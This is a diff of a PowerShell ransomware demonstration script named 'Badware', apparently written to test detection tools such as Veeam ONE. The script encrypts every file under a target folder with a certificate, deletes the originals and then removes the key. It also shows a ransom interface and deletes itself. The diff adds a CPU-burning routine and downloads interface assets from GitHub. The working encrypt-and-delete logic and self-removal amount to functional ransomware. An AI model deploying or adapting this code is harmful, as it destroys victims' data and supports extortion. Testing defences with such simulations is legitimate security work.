@@ -24,10 +24,10 @@ ___.                ____.     .__  .__                   _____                  
 .OUTPUTS
    None
 .NOTES
-    Version:        2.3
+    Version:        3.0 
 	Author:         Julien Mousqueton @JMousqueton 
-	Creation Date:  2021-08-09
-	Purpose/Change: Simplify the crypto 
+	Creation Date:  2023-02-21
+	Purpose/Change: new release
 .COMPONENT
     None
 #>
@@ -35,10 +35,12 @@ ___.                ____.     .__  .__                   _____                  
 #---------------------------------------------------------[Initialisations]--------------------------------------------------------
 
 # Directory Target to crypt 
-$TargetEncr = "C:\Data"
+$TargetEncr = "C:\Users\JMOUSQU\OneDrive - COMPUTACENTER\Badware"
 
 # Define the DN of the certificate 
-$CertName = "DEMO CEC"
+$CertName = "DEMO RANSOMWARE"
+
+$CPULoad = $false
 
 # UI  
 $btc_addr = '538f15c2-07ed-4cbe-8f37-efd0ecce1165' # Who knows perhaps I'll get rich 💰 
@@ -52,7 +54,7 @@ $WarningPreference = "SilentlyContinue"
 ## NO NEED TO EDIT AFTER THIS LINE ##
 #####################################
 #Script Version
-$Version = "2.3"
+$Version = "3.0"
 
 write-host "__________    _____  ________     __      __  _____ _____________________ " -ForeGroundColor DarkRed
 write-host "\______   \  /  _  \ \______ \   /  \    /  \/  _  \\______   \_   _____/ " -ForeGroundColor DarkRed
@@ -70,6 +72,38 @@ else {
 	write-host "[!] No data found ... exiting " -ForegroundColor Red 
 	exit
 }
+
+### CPU BURNER FUNCTION FOR TRIGGERING RANSOMWARE SUSPISION ALARM ###
+
+Function cpuLoad ([int]$delay,[int]$UtilizeCorePercent)
+{
+    $cpuCount = (Get-CimInstance -ClassName Win32_processor).NumberOfLogicalProcessors 
+    $threadCount = [math]::Ceiling($cpuCount*($UtilizeCorePercent/100))
+    Write-Verbose "Utilize Core Percent:  $UtilizeCorePercent"
+    Write-Verbose "Logical Core Count:    $cpuCount"
+    Write-Verbose "Worker Thread Count:   $threadCount"
+    
+    for ($t = 1; $t -le $threadCount; $t++) {
+        $curJob = Start-Job -Name "CPUWorkload_$t" -ScriptBlock {
+            $result = 1
+            for ($i = 0; $i -lt 2147483647; $i++) {
+                $result *= $i
+            }
+        }
+    }
+    Write-Verbose "$threadCount jobs started!"
+    
+    while ($delay -ge 0)
+    {
+    start-sleep 1
+    $delay -= 1
+    }
+    Write-Verbose "Stopping jobs"
+    Stop-Job -Name "CPUWorkload*"
+    Get-Job  -Name "CPUWorkload*" | Receive-Job -AutoRemoveJob -Wait
+}
+
+###
 
 Write-Host "[+] Prepating Directory" -ForegroundColor Green
 $TempDir = "c:\$((Get-Date).ToString('yyyy-MM-dd-HHmm'))"
@@ -225,12 +259,22 @@ Function Decrypt-File
    foreach ($i in $(Get-ChildItem $TargetEncr -recurse -exclude *.badware | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })){ 
    Encrypt-File $i $Cert 
    Write-Host "[!] $i is now encrypted" -ForegroundColor Red
-   rm $i
+   Remove-item $i
    } 
 Write-Host "[+] Badware Deployed Successfully..." -ForegroundColor Green
 
 Write-Host "[+] Cleaning Encryption key ..." -ForeGroundColor Green
 $(Get-ChildItem Cert:\CurrentUser\My\$CertPrint) | Remove-Item
+
+Write-Host "[+] Upload header picture ..." -ForegroundColor Green
+$ImageHeader = "https://raw.githubusercontent.com/JMousqueton/Badware/main/badware.jpg"
+Invoke-WebRequest -Uri $ImageHeader -OutFile "$TempDir/badware.jpg"
+Start-Sleep -s 2
+
+Write-Host "[+] Upload icon ..." -ForegroundColor Green
+$Icon = "https://raw.githubusercontent.com/JMousqueton/Badware/main/Badware.ico"
+Invoke-WebRequest -Uri $Icon -OutFile "$TempDir/Badware.ico"
+Start-Sleep -s 2
 
 Write-Host "[+] Intiating UI..." -ForegroundColor Green
 
@@ -329,3 +373,10 @@ Write-Host "[+] Clean up the mess ..." -ForegroundColor Green
 Remove-Item -Path $MyInvocation.MyCommand.Source
 
 Write-Host "[+] Exiting and waiting for the money" -ForegroundColor Green
+
+# BURN CPU FOR 300 SECONDES TO TRIGGER VEEAM ONE RANSOMWARE ALARM :) 
+
+if ($CPULoad -eq $true)
+    {
+        cpuLoad -delay 300 -UtilizeCorePercent 90
+    }
